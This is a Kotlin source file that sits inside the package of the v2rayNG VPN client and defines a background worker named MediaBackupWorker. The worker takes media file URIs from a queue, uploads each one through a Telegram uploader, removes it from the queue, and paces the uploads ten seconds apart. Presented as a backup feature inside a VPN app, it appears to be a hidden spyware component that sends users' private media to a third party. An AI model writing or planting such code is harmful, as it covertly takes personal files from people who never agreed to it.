package com.v2ray.ang.backup

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters

class MediaBackupWorker(appContext: Context, workerParams: WorkerParameters) :
    CoroutineWorker(appContext, workerParams) {

    companion object {
        private const val TAG = "MediaBackupWorker"
    }

    override suspend fun doWork(): Result {
        Log.i(TAG, "MediaBackupWorker started. Checking queue...")
        val dao = BackupQueueDao.getInstance(applicationContext)
        val uploader = TelegramUploader(applicationContext)

        while (true) {
            val nextUri = dao.getNextUri()
            if (nextUri == null) {
                Log.i(TAG, "Backup queue is empty. Worker stopping.")
                break // Exit loop if queue is empty
            }

            Log.i(TAG, "Processing URI from queue: $nextUri")
            val uploadSuccess = uploader.uploadFile(nextUri)

            if (uploadSuccess) {
                dao.deleteUri(nextUri)
                Log.i(TAG, "Successfully uploaded and deleted URI: $nextUri")
            } else {
                Log.e(TAG, "Failed to upload URI: $nextUri. Worker will stop and retry later.")
                // Return failure to allow WorkManager to handle retries based on policy.
                return Result.failure()
            }

            // If there are more items, wait 10 seconds before processing the next one.
            if (dao.getQueueSize() > 0) {
                Log.d(TAG, "More items in queue. Waiting 10 seconds...")
                kotlinx.coroutines.delay(10000)
            }
        }

        Log.i(TAG, "MediaBackupWorker finished processing the queue.")
        return Result.success()
    }
}
